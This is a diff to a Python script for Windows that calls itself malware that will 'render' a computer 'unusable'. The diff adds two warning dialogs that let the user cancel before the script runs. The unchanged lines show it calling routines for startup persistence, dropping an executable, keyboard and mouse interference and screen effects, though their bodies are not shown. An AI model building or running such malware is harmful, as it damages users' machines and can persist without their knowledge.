@@ -31,6 +31,45 @@ import shutil
 import base64
 import tempfile
 import zipfile
+import sys
+
+def show_warning_and_check():
+    MB_YESNO = 0x04
+    MB_ICONWARNING = 0x30
+    IDYES = 6
+    IDNO = 7
+
+    message = (
+        "The software you just ran is considered to be malware.\n"
+        "This malware will harm your computer and render it unusable.\n"
+        "If you're seeing this message without knowing what you just executed, simply click \"No\" and nothing will happen.\n"
+        "If you are aware of what this malware does and are using a secure environment for testing, click \"Yes\" to proceed.\n\n"
+        "DO YOU WANT TO RUN THIS MALWARE, WHICH WILL MAKE YOUR MACHINE UNUSABLE?"
+    )
+
+    result = ctypes.windll.user32.MessageBoxW(0, message, "WARNING", MB_YESNO | MB_ICONWARNING)
+
+    if result == IDNO:
+        print("good idea")
+        sys.exit(0)
+
+def last():
+    MB_YESNO = 0x04
+    MB_ICONWARNING = 0x30
+    IDYES = 6
+    IDNO = 7
+
+    message = (
+        "THIS IS THE FINAL WARNING!\n"
+        "The creator is not liable for any damage caused by using this malware.\n"
+        "Do you still wish to execute it?\n"
+    )
+
+    result = ctypes.windll.user32.MessageBoxW(0, message, "WARNING", MB_YESNO | MB_ICONWARNING)
+
+    if result == IDNO:
+        print("good idea")
+        sys.exit(0)
 
 def get_real_desktop_path():
     key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
@@ -371,6 +410,8 @@ def apply_screen_effects_and_shake_mouse():
         bitmap.DeleteObject()
 
 if __name__ == "__main__":
+	show_warning_and_check()
+    last()
     textFile()
     keyborad()
     drawing_thread5 = threading.Thread(target=shake_mouse_continuous)
@@ -417,4 +458,5 @@ if __name__ == "__main__":
     extract_and_copy_exe()
     add_batch_to_startup()
     threading.Thread(target=bytebeat_audio_loop, daemon=True).start()
+
     apply_screen_effects_and_shake_mouse()
